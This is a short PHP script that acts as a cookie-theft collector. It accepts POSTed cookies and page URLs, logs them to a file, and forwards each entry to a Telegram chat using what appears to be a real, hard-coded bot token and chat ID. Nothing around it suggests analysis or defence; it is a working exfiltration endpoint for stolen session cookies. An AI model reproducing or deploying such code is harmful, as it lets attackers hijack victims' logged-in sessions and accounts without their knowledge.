<?php
// === Config ===
$telegramBotToken = '5334671140:AAEsTyEaXs4SjRe191ZJIswKIdguMrBaxIY';
$telegramChatId = '5111927097';
$dataFile = 'collected_cookies.txt';

// === Read POST Data ===
$input = json_decode(file_get_contents("php://input"), true);
$cookies = $input['cookies'] ?? '';
$page = $input['page'] ?? '';
$timestamp = date("Y-m-d H:i:s");

$entry = "[{$timestamp}]\nPage: {$page}\nCookies: {$cookies}\n\n";

// === Save to file ===
file_put_contents($dataFile, $entry, FILE_APPEND);

// === Send to Telegram (optional) ===
if (!empty($telegramBotToken) && !empty($telegramChatId)) {
    $message = urlencode("🍪 New Cookie Entry:\nURL: {$page}\nCookies: {$cookies}");
    $url = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage?chat_id={$telegramChatId}&text={$message}";
    file_get_contents($url);
}

// === Response ===
echo json_encode(["status" => "ok"]);
?>